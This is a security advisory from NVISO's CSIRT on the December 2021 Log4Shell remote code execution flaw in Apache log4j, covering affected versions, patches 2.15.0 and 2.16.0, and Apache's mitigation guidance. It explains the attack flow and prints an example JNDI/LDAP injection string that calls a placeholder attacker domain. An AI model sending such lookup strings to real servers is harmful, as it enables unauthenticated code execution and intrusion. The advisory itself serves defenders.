## NVISO CSIRT ADVISORY
**Last update: 2021-12-14**


## SUMMARY
In this advisory we provide an overview of the recently discovered vulnerability in Apache log4j and how attackers can abuse it. We will update this blog post as more information is released. 

A high severity vulnerability in Apache log4j was disclosed publicly on 9 December 2021. This vulnerability was initially discovered by Chen Zhaojun of the Alibaba Cloud Security Team.

Log4j is an open-source Java logging library that is widely used in many applications and is present as a dependency in many services. This includes enterprise applications and numerous cloud services. 
 
This vulnerability allows for unauthenticated remote code execution using the following flow:
1.	Attacker sends data to the server (via any protocol). 
2.	The server (with log4j enabled) logs the data in the request, containing the malicious payload: `${jndi:ldap//attackerowneddomain.com/a}`
3.	The log4j vulnerability is triggered by this payload and the server makes a request to the attackerowneddomain.com via JNDI (Java Naming and Directory Interface). This also works using RMI (see link to SANS ISC post below)
5.	The server owned by the attacker responds to the request with a path to a remote (malicious) Java class file. This file is then injected in in the server process
6.	This malicious Java class file upon execution can trigger arbitrary code execution

## WHY THIS MATTERS
Given how widespread this library is used and how easy the exploit is, the impact of this vulnerability can be seen as very severe. 

On 10 December 2021 a PoC (Proof of Concept) was released for this vulnerability (https://github.com/tangxiaofeng7/apache-log4j-poc). Currently extensive scanning is being performed and a number of active exploitation attempts have been observed as well. In a first stage this vulnerability has been seen being used to deploy cryptocurrency mining software, this vulnerability will however be abused to gain an foothold in your network that can be used by a variety of attacks, now, or at a later stage (e.g. ransomware attacks, data theft, etc.). 

NCSC-NL has provided a list of vulnerable and non-vulnerable software to the log4j exploit, which can be found here: https://github.com/NCSC-NL/log4shell/tree/main/software

## RECOMMENDED ACTIONS
Critical risk vulnerabilities should be fully patched as soon as possible. 

Given the ease of exploitation it is strongly suggested to apply the patches for internet facing software immediately. Applying the patches to your internal software is recommended to be done at your earliest convenience.


## AFFECTED PRODUCTS
All Apache log4j versions from 2.0 up to and including 2.14.1 

All frameworks that use these versions (e.g. Apache Structs2, Apache Solr, Apache Druid, Apache Flink, etc.)

Version 1 of log4j is vulnerable to other RCE attacks, and if you're using it you need to migrate to 2.16.0.

### Previous mitigations listed here have been removed. It was still possible to exploit the vulnerability with those in place. We have removed them and placed the most current update from The Apache Software Foundation in its place. Also the 2.15.0 patch was vulnerable as well. 2.16.0 is the recommend patch level. 

## Guidance from The Apache Software Foundation:
https://logging.apache.org/log4j/2.x/security.html
>
>Mitigation
>Log4j 1.x mitigation: Log4j 1.x does not have Lookups so the risk is lower. Applications using Log4j 1.x are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate: audit your logging configuration to ensure it has no JMSAppender configured. Log4j 1.x configurations without JMSAppender are not impacted by this vulnerability.
>
>Log4j 2.x mitigation: Implement one of the mitigation techniques below.
>* Java 8 (or later) users should upgrade to release 2.16.0.
>* Users requiring Java 7 should upgrade to release 2.12.2 when it becomes available (work in progress, expected to be available soon).
>* Otherwise, remove the JndiLookup class from the classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
>   Note that only the log4j-core JAR file is impacted by this vulnerability. Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted by this vulnerability.
>
>#### History
>Older (discredited) mitigation measures
>
>This page previously mentioned other mitigation measures, but we discovered that these measures only limit exposure while leaving some attack vectors open.
>
>The 2.15.0 release was found to still be vulnerable when the configuration has a pattern layout containing a Context Lookup (for example, $${ctx:loginId}), or a Thread Context Map pattern %X, %mdc or %MDC. When an attacker can control Thread Context values, they may inject a JNDI Lookup pattern, which will be evaluated and result in a JNDI connection. Log4j 2.15.0 restricts JNDI connections to localhost by default, but this may still result in DOS (Denial of Service) attacks, or worse.
>
>A new CVE (CVE-2021-45046, see *website above*) was raised for this.
>
>Other insufficient mitigation measures are: setting system property log4j2.formatMsgNoLookups or environment variable LOG4J_FORMAT_MSG_NO_LOOKUPS to true for releases >= 2.10, or modifying the logging configuration to disable message lookups with %m{nolookups}, %msg{nolookups} or %message{nolookups} for releases >= 2.7 and <= 2.14.1.
>
>The reason these measures are insufficient is that, in addition to the Thread Context attack vector mentioned above, there are still code paths in Log4j where message lookups could occur: known examples are applications that use Logger.printf("%s", userInput), or applications that use a custom message factory, where the resulting messages do not implement StringBuilderFormattable. There may be other attack vectors.
>
>The safest thing to do is to upgrade Log4j to a safe version, or remove the JndiLookup class from the log4j-core jar.


## AVAILABLE PATCHES
On December 10, 2021, version 2.15.0 RC2 was released. This patch was vulnerable to CVE-2021-45046.

On December 13, 2021, a new version (2.16.0) of log4j was released, disabling JNDI by default: https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0
